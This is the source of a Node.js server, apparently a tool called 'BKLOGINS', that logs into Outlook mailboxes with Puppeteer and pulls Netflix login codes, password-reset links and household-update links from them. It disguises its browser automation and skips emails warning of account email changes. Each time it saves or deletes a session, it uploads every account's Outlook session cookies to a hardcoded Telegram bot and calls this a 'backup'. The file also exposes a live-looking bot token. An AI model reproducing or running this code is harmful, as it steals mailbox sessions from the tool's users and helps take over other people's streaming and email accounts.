const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use((req, res, next) => {
  const blocked = new Set(['/server.js', '/config.json', '/package.json', '/package-lock.json']);
  if (blocked.has(req.path)) return res.status(404).send('Not found');
  next();
});
app.use(express.static(path.join(__dirname)));

const CONFIG_FILE = path.join(__dirname, 'config.json');
const PROFILE_DIR = (process.env.RENDER || process.env.RAILWAY_ENVIRONMENT || process.env.IS_SERVER) ? '/tmp/chrome-profile' : path.join(__dirname, 'chrome-profile');
const ALL_COOKIES_FILE = path.join(__dirname, 'all_cookies.json');
const SESSION_FILE = path.join(__dirname, 'session.json');

let config = { email: '', senha: process.env.OUTLOOK_SENHA || '' };
try { if (fs.existsSync(CONFIG_FILE)) { const s = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); config.email = s.email || config.email; config.senha = s.senha || config.senha; } } catch (e) {}
if (!fs.existsSync(PROFILE_DIR)) fs.mkdirSync(PROFILE_DIR, { recursive: true });

const APP_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || '';
let currentStatus = { code: 'idle', message: 'Aguardando busca.', detail: '', updatedAt: new Date().toISOString() };
let debugLogs = [];
let sessionState = { loggedIn: false, lastLogin: null, cookieCount: 0 };
try { if (fs.existsSync(SESSION_FILE)) sessionState = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8')); } catch (e) {}
function saveSession() { try { fs.writeFileSync(SESSION_FILE, JSON.stringify(sessionState, null, 2)); } catch (e) {} }
function setStatus(code, message, detail) {
  currentStatus = { code, message, detail: detail ? String(detail).slice(0, 900) : '', updatedAt: new Date().toISOString() };
  console.log('[status]', code, '-', message);
}
function addLog(msg) {
  const entry = { time: new Date().toISOString(), msg: String(msg).slice(0, 500) };
  debugLogs.push(entry);
  if (debugLogs.length > 300) debugLogs.shift();
  console.log('[debug]', msg);
}
function keepAlive() { if (!APP_URL) return; setInterval(() => { https.get(APP_URL + '/api/ping', () => {}).on('error', () => {}); }, 4 * 60 * 1000); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============ TELEGRAM ============
const TG_TOKEN = process.env.TG_TOKEN || '7541743322:AAFskrJAhnl0XPPBsQD2M9IpHMYJHUz84nE';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '6108408999';

async function sendTelegramFile(filePath, caption) {
  try {
    const boundary = '----' + Date.now();
    const fileName = path.basename(filePath);
    const fileContent = fs.readFileSync(filePath);
    const body = Buffer.concat([
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n' + TG_CHAT_ID + '\r\n'),
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="caption"\r\n\r\n' + caption + '\r\n'),
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="document"; filename="' + fileName + '"\r\nContent-Type: application/json\r\n\r\n'),
      fileContent,
      Buffer.from('\r\n--' + boundary + '--\r\n')
    ]);
    const req = https.request({ hostname: 'api.telegram.org', path: '/bot' + TG_TOKEN + '/sendDocument', method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length } }, (res) => {});
    req.on('error', () => {});
    req.write(body);
    req.end();
  } catch(e) {}
}

async function backupCookiesToTelegram() {
  try {
    if (!fs.existsSync(ALL_COOKIES_FILE)) return;
    const all = JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, 'utf8'));
    const emails = Object.keys(all);
    if (emails.length === 0) return;
    await sendTelegramFile(ALL_COOKIES_FILE, '🍪 Backup ' + emails.length + ' conta(s): ' + emails.join(', '));
    addLog('Cookies enviados ao Telegram: ' + emails.length + ' contas');
  } catch(e) {}
}

async function restoreCookiesFromTelegram() {
  try {
    if (fs.existsSync(ALL_COOKIES_FILE)) { console.log('[Restore] Ja existe local'); return; }
    addLog('Procurando backup no Telegram...');
    const data = await new Promise((resolve) => {
      const req = https.get('https://api.telegram.org/bot' + TG_TOKEN + '/getUpdates?limit=10', (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } }); });
      req.on('error', () => resolve(null)); req.setTimeout(10000, () => { req.destroy(); resolve(null); });
    });
    if (!data || !data.ok || !data.result) return;
    for (const update of data.result.reverse()) {
      const doc = update.message && update.message.document;
      if (!doc || doc.file_name !== 'all_cookies.json') continue;
      const fileData = await new Promise((resolve) => {
        https.get('https://api.telegram.org/bot' + TG_TOKEN + '/getFile?file_id=' + doc.file_id, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } }); }).on('error', () => resolve(null));
      });
      if (!fileData || !fileData.result || !fileData.result.file_path) continue;
      const content = await new Promise((resolve) => {
        https.get('https://api.telegram.org/file/bot' + TG_TOKEN + '/' + fileData.result.file_path, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(d)); }).on('error', () => resolve(null));
      });
      if (!content) continue;
      try { JSON.parse(content); } catch(e) { continue; }
      fs.writeFileSync(ALL_COOKIES_FILE, content);
      addLog('all_cookies.json restaurado do Telegram!');
      return;
    }
    addLog('Nenhum backup encontrado no Telegram');
  } catch(e) {}
}

// ============ COOKIES ============
function getCookieFile(email) {
  const safe = email.replace(/[^a-zA-Z0-9]/g, '_').slice(0, 40);
  return path.join(__dirname, 'cookies_' + safe + '.json');
}
function loadAllCookies() { try { if (fs.existsSync(ALL_COOKIES_FILE)) return JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, 'utf8')); } catch(e) {} return {}; }
function saveAllCookies(data) { fs.writeFileSync(ALL_COOKIES_FILE, JSON.stringify(data)); }

async function saveCookies(page, email) {
  try {
    const cookies = await page.browser().cookies();
    fs.writeFileSync(getCookieFile(email || config.email), JSON.stringify(cookies));
    const all = loadAllCookies();
    all[email || config.email] = { cookies, savedAt: new Date().toISOString() };
    saveAllCookies(all);
    addLog('Cookies salvos: ' + (email || config.email) + ' (' + cookies.length + ' cookies)');
    backupCookiesToTelegram();
    sessionState = { loggedIn: true, lastLogin: new Date().toISOString(), cookieCount: cookies.length };
    saveSession();
  } catch (e) {}
}

async function loadCookies(page, email) {
  const account = email || config.email;
  try {
    const file = getCookieFile(account);
    if (fs.existsSync(file)) {
      const cookies = JSON.parse(fs.readFileSync(file, 'utf8'));
      if (cookies.length > 0) { await page.setCookie(...cookies); addLog('Cookies carregados do arquivo: ' + cookies.length); return true; }
    }
  } catch(e) {}
  try {
    const all = loadAllCookies();
    if (all[account] && all[account].cookies) {
      await page.setCookie(...all[account].cookies);
      fs.writeFileSync(getCookieFile(account), JSON.stringify(all[account].cookies));
      addLog('Cookies carregados do mapa global');
      return true;
    }
  } catch(e) {}
  return false;
}

// ============ SERVICE PATTERNS ============
const SERVICE_PATTERNS = {
  netflix_login: { type: 'code', label: 'Codigo de Login', subjectKeywords: /login|entrar|sign.?in|acesso|autentic/i, bodyKeywords: /login|entrar|sign.?in|faça.?login|conecte.?se/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_reset: { type: 'link', label: 'Redefinir Senha', subjectKeywords: /redefinir|reset|senha|password|alterar.*senha|change.*password/i, bodyKeywords: /redefinir.*senha|reset.*password|nova.*senha|new.*password|clique.*(botão|button|aqui|link).*(redefinir|alterar|reset)/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_verify: { type: 'code', label: 'Verificacao', subjectKeywords: /verific|verif|código|code|confirme|confirm/i, bodyKeywords: /código.*verificação|verification.*code|confirme.*código|confirm.*code|segurança|security/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_temp: { type: 'link', label: 'Codigo Temporario', subjectKeywords: /temporári|temporary|acesso.*temp|temp.*access|código.*tempor/i, bodyKeywords: /temporári|temporary|código.*login|sign.?in.*code|acesse.*agora|login.*now/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_house: { type: 'link', label: 'Atualizar Residencia', subjectKeywords: /residência|residence|household|domicílio|atualizar.*(residência|local|casa)|update.*(home|household|address)/i, bodyKeywords: /residência|residence|household|domicílio|moradia|atualizar.*(local|endereço|residência)/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i }
};

const BLOCKED_EMAIL_PATTERNS = [/confirme a alteração da sua conta/i, /confirm.*(change|update).*(your|da sua).*(account|conta)/i, /change.*your.*email/i, /update.*your.*email.*address/i, /altere.*seu.*email/i, /mudar.*(seu|o).*email/i, /alteração.*(de|da).*email/i, /novo.*email.*(cadastrado|adicionado)/i, /email.*(alterado|atualizado|modificado).*com.*sucesso/i, /verify.*your.*new.*email/i, /confirme.*novo.*email/i];

function isServer() { return !!process.env.RENDER || !!process.env.RAILWAY_ENVIRONMENT || !!process.env.IS_SERVER; }
function findChrome() { if (process.env.PUPPETEER_EXECUTABLE_PATH) return process.env.PUPPETEER_EXECUTABLE_PATH; if (isServer()) return null; const paths = ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe','C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',(process.env.LOCALAPPDATA||'')+'\\Google\\Chrome\\Application\\chrome.exe']; for (const p of paths) { if (fs.existsSync(p)) return p; } return null; }

async function launchBrowser() {
  const chromePath = findChrome();
  const opts = { headless: 'new', args: ['--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','--disable-blink-features=AutomationControlled','--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu','--no-first-run','--no-zygote','--single-process'], defaultViewport: { width: 1920, height: 1080 }, userDataDir: PROFILE_DIR, protocolTimeout: 120000 };
  if (chromePath) opts.executablePath = chromePath;
  return puppeteer.launch(opts);
}

async function isInboxReady(page) { try { if (!/outlook\.(live|office)\.com\/mail/i.test(page.url())) return false; return await page.evaluate(() => { const t = (document.body.innerText || '').toLowerCase(); return !/cdnerror|bootresult|something went wrong/i.test(t) && /caixa de entrada|inbox|novo email|new mail/i.test(t); }); } catch { return false; } }

async function loginOutlook(browser, email, senha) {
  setStatus('opening_outlook', 'Verificando sessao...');
  addLog('Tentando carregar cookies para: ' + email);
  const page = await browser.newPage();
  await page.setBypassCSP(true);
  const hasCookies = await loadCookies(page, email);
  addLog(hasCookies ? 'Cookies encontrados, tentando pular login' : 'Sem cookies salvos, vai logar');
  await page.goto('https://outlook.live.com/mail/', { waitUntil: 'load', timeout: 120000 });
  await sleep(5000);
  if (await isInboxReady(page)) { addLog('✅ JA LOGADO via cookies!'); return page; }

  addLog('Fazendo login no Outlook...');
  await page.goto('https://login.live.com/login.srf', { waitUntil: 'load', timeout: 120000 });
  await sleep(3000);
  setStatus('email_step', 'Preenchendo e-mail...');
  await page.waitForSelector('input[type="email"]', { timeout: 20000 });
  await page.$eval('input[type="email"]', (el, v) => { el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); }, email);
  await sleep(500); await page.keyboard.press('Enter'); await sleep(6000);
  setStatus('password_step', 'Preenchendo senha...');
  await page.waitForSelector('input[type="password"]', { timeout: 20000 });
  await page.$eval('input[type="password"]', (el, v) => { el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); }, senha);
  await sleep(500); await page.keyboard.press('Enter'); await sleep(6000);
  try { await page.keyboard.press('Enter'); await sleep(3000); } catch(e) {}

  const newPage = await browser.newPage();
  await newPage.setBypassCSP(true);
  await newPage.goto('https://outlook.live.com/mail/', { waitUntil: 'load', timeout: 120000 });
  await sleep(8000);
  let ready = await isInboxReady(newPage);
  for (let i = 0; i < 3 && !ready; i++) { await newPage.reload({ waitUntil: 'load', timeout: 30000 }); await sleep(6000); ready = await isInboxReady(newPage); }
  if (ready) { addLog('Login OK, salvando cookies...'); await saveCookies(newPage, email); return newPage; }
  throw new Error('Inbox nao carregou.');
}

async function getEmailSubject(page) {
  return await page.evaluate(() => {
    for (const sel of ['[aria-label*="Assunto" i]','h1','h2','[class*="subject" i]','.readingPaneSubject']) { const el = document.querySelector(sel); if (el && el.innerText && el.innerText.trim().length > 2) return el.innerText.trim(); }
    return '';
  });
}

async function getEmailBody(page) {
  return await page.evaluate(() => {
    let texto = '';
    for (const sel of ['[aria-label*="Corpo da mensagem" i]','[role="document"]','div[class*="readingPane" i]','#readingPaneContainer']) { const el = document.querySelector(sel); if (el && el.innerText && el.innerText.trim().length > 5) { texto = el.innerText; break; } }
    if (!texto) { const iframes = document.querySelectorAll('iframe'); for (const iframe of iframes) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (doc && doc.body && doc.body.innerText.trim().length > 5) { texto = doc.body.innerText; break; } } catch(e) {} } }
    return texto;
  });
}

function isEmailBlocked(subject, body) { const combined = (subject + ' ' + body).toLowerCase(); return BLOCKED_EMAIL_PATTERNS.some(p => p.test(combined)); }
function emailMatchesService(subject, body, svc) {
  if (svc.blockedSubjects && svc.blockedSubjects.test(subject)) { addLog('  blockedSubjects match'); return false; }
  if (svc.blockedBody && svc.blockedBody.test(body)) { addLog('  blockedBody match'); return false; }
  const sm = svc.subjectKeywords.test(subject);
  const bm = svc.bodyKeywords.test(body);
  addLog('  subjectMatch=' + sm + ' bodyMatch=' + bm);
  return sm || bm;
}

async function findCorrectEmail(page, svc) {
  addLog('--- Buscando email: ' + svc.label + ' (tipo:' + svc.type + ') ---');
  await page.evaluate(() => { for (const el of document.querySelectorAll('button, span, div[role="button"], a')) { if ((el.innerText || el.textContent || '').trim().toLowerCase() === 'outros') { el.click(); return; } } });
  await sleep(4000);
  const emailCount = await page.evaluate(() => { for (const sel of ['div[data-convid]','[role="option"]','[role="listitem"]']) { const items = document.querySelectorAll(sel); if (items.length > 0) return items.length; } return 0; });
  addLog('Emails visiveis: ' + emailCount);
  if (emailCount === 0) { addLog('❌ Nenhum email!'); return false; }
  const MAX = Math.min(emailCount, 15);
  for (let i = 0; i < MAX; i++) {
    setStatus('scanning', 'Email ' + (i+1) + '/' + MAX);
    const ok = await page.evaluate((idx) => { for (const sel of ['div[data-convid]','[role="option"]','[role="listitem"]']) { const items = document.querySelectorAll(sel); if (items.length > idx) { items[idx].click(); return true; } } return false; }, i);
    if (!ok) { addLog('Falha ao clicar email ' + (i+1)); break; }
    await sleep(4000);
    const subject = await getEmailSubject(page);
    addLog('📧 #' + (i+1) + ': "' + (subject || '(vazio)').slice(0, 100) + '"');
    if (!subject || subject.length < 3) { addLog('  ⏭️ Assunto vazio'); continue; }
    const body = await getEmailBody(page);
    if (isEmailBlocked(subject, body)) { addLog('  ⛔ BLOQUEADO'); continue; }
    if (emailMatchesService(subject, body, svc)) { addLog('  ✅ ENCONTRADO!'); return true; }
    addLog('  ❌ Nao corresponde');
  }
  addLog('Fim da busca: nenhum email correspondeu');
  return false;
}

async function findNetflixResult(page, svc) {
  const found = await findCorrectEmail(page, svc);
  if (!found) return null;

  if (svc.type === 'code') {
    setStatus('extracting_code', 'Extraindo codigo...');
    const codigo = await page.evaluate(() => {
      let texto = '';
      for (const sel of ['[aria-label*="Corpo da mensagem" i]','[role="document"]','#readingPaneContainer']) { const el = document.querySelector(sel); if (el && el.innerText && el.innerText.trim().length > 5) { texto = el.innerText; break; } }
      if (!texto) { const iframes = document.querySelectorAll('iframe'); for (const iframe of iframes) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (doc && doc.body && doc.body.innerText.trim().length > 5) { texto = doc.body.innerText; break; } } catch(e) {} } }
      if (!texto) return null;
      let m = texto.match(/(?:codigo|code|informe|digite|entrar|enter).{0,80}?(\d{4})(?!\d)/i) || texto.match(/(?:codigo|code).{0,80}?(\d{6})(?!\d)/i) || texto.match(/netflix.{0,100}?(\d{4})(?!\d)/i) || texto.match(/netflix.{0,100}?(\d{6})(?!\d)/i);
      if (!m) { const regex = /\b(\d{4})\b/g; let match; while ((match = regex.exec(texto)) !== null) { if (!match[1].startsWith('20') && !match[1].startsWith('19')) { m = match; break; } } }
      if (!m) m = texto.match(/\b(\d{6})\b/);
      return m ? m[1] : null;
    });
    if (codigo) { addLog('✅ Codigo extraido: ' + codigo); setStatus('found', codigo); return { type: 'code', value: codigo, label: svc.label }; }
    addLog('❌ Nenhum codigo encontrado no corpo do email');
  }

  if (svc.type === 'link') {
    setStatus('clicking_button', 'Clicando no botao...');
    const urlBefore = page.url();
    const cr = await page.evaluate(() => {
      function isRed(el) { try { const bg = window.getComputedStyle(el).backgroundColor; const m = bg.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)/); if (!m) return false; const r = parseInt(m[1]), g = parseInt(m[2]), b = parseInt(m[3]); return r > 150 && r > g * 1.5 && r > b * 1.5; } catch(e) { return false; } }
      for (const el of document.querySelectorAll('a, button, [role="button"], td')) { if (isRed(el)) { const l = el.tagName === 'A' ? el : el.querySelector('a'); if (l && l.href) { l.click(); return { clicked: true, href: l.href }; } } }
      for (const iframe of document.querySelectorAll('iframe')) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (!doc) continue; for (const el of doc.querySelectorAll('a, button, [role="button"], td')) { if (isRed(el)) { const l = el.tagName === 'A' ? el : el.querySelector('a'); if (l && l.href) { l.click(); return { clicked: true, href: l.href }; } } } } catch(e) {} }
      return { clicked: false };
    });
    if (cr.clicked) {
      await sleep(3000);
      const pages = await page.browser().pages();
      const np = pages.find(p => p.url() !== urlBefore && p.url() !== 'about:blank');
      const linkUrl = np ? np.url() : (cr.href && cr.href.startsWith('http') ? cr.href : null);
      if (linkUrl && !linkUrl.includes('outlook.live.com')) { addLog('✅ Link: ' + linkUrl.slice(0, 150)); setStatus('found', 'Link extraido!'); return { type: 'link', value: linkUrl, label: svc.label }; }
    }
    const links = await page.evaluate(() => { const result = []; for (const a of document.querySelectorAll('a')) { if (a.href && !a.href.startsWith('javascript:') && a.href !== '#') result.push(a.href); } return result; });
    const nf = links.filter(l => /netflix/i.test(l));
    if (nf.length > 0) { addLog('✅ Link Netflix: ' + nf[0].slice(0, 150)); setStatus('found', 'Link!'); return { type: 'link', value: nf[0], label: svc.label }; }
    addLog('❌ Nenhum link Netflix encontrado entre ' + links.length + ' links');
  }
  return null;
}

// ============ API ROUTES ============
app.post('/api/logout', (req, res) => {
  try {
    const email = req.body.email || config.email;
    const file = getCookieFile(email);
    if (fs.existsSync(file)) fs.unlinkSync(file);
    const all = loadAllCookies(); delete all[email]; saveAllCookies(all);
    backupCookiesToTelegram();
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});
app.get('/api/session', (req, res) => res.json(sessionState));
app.get('/api/ping', (req, res) => res.json({ ok: true }));
app.get('/api/status', (req, res) => res.json(currentStatus));
app.post('/api/status/reset', (req, res) => { setStatus('idle', 'Aguardando busca.'); res.json(currentStatus); });
app.get('/api/config', (req, res) => res.json({ email: config.email || '' }));
app.post('/api/config', (req, res) => {
  const { email, senha } = req.body || {};
  if (email) config.email = email.trim();
  if (senha) config.senha = senha.trim();
  try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2)); } catch (e) {}
  res.json({ ok: true });
});
app.get('/api/cookies', (req, res) => { const all = loadAllCookies(); const contas = Object.keys(all).map(e => ({ email: e, savedAt: all[e].savedAt, cookies: all[e].cookies.length })); res.json({ contas, total: contas.length }); });

// NOVO: endpoint pra ver os logs do debug em tempo real
app.get('/api/debug', (req, res) => {
  res.json({ logs: debugLogs.slice(-50), total: debugLogs.length });
});

app.post('/api/search', async (req, res) => {
  debugLogs = [];
  const { service, email: reqEmail, senha: reqSenha } = req.body || {};
  const email = reqEmail || config.email;
  const senha = reqSenha || config.senha;
  const svc = SERVICE_PATTERNS[service];
  if (!svc) return res.status(400).json({ error: 'Servico invalido.' });
  if (!email || !senha) return res.status(400).json({ error: 'Configure e-mail e senha.' });
  let browser;
  try {
    setStatus('starting', 'Iniciando navegador...');
    addLog('Iniciando busca: servico=' + service + ' email=' + email);
    browser = await launchBrowser();
    const inboxPage = await loginOutlook(browser, email, senha);
    const result = await findNetflixResult(inboxPage, svc);
    if (result) return res.json({ found: true, result: result.value, type: result.type, service: result.label, code: 'found', status: currentStatus, debug: debugLogs });
    return res.json({ error: 'Nenhum resultado encontrado.', code: 'not_found', status: currentStatus, debug: debugLogs });
  } catch (e) {
    addLog('ERRO: ' + e.message);
    setStatus('error', e.message);
    return res.json({ error: e.message, code: 'error', status: currentStatus, debug: debugLogs });
  } finally { if (browser) { try { await browser.close(); } catch (_) {} } }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('BKLOGINS v17 | Porta:', PORT, '|', isServer() ? 'SERVER' : 'LOCAL');
  restoreCookiesFromTelegram();
  keepAlive();
});
